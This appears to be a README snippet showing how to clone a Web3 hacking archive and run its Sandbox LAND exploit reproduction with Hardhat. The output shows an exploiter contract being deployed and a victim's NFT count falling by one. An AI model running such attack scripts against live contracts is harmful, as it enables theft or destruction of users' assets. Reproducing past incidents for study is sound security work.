```
$  git clone --depth 1 https://github.com/xxxeyJ/Web3.0-Hacking-Archives
$  cd ./Web3.0-Hacking-Archives-main
$  cd Sandbox_LANDs
$  ls
README.md         contracts         hardhat.config.js package-lock.json package.json      scripts
$  npm install
$  vim hardhat.config.js // Fill in the RPC archive node KEY
$  npx hardhat run scripts/attack.js
[#] 👀 Exploiter Smart Contract deployed to: 0x7bc06c482DEAd17c0e297aFbC32f6e63d3846650
[#] 🧛‍♀️ Amount of NFT held before the attack: 4012
[+] 🥷 Exploiting Transcation Hash: 0x3d4184fd29c7d052c2e659708e45384aa9161d389066645b86f1536e235d92dd
[#] 🧛‍♀️ Amount of NFT held after the attack: 4011
```
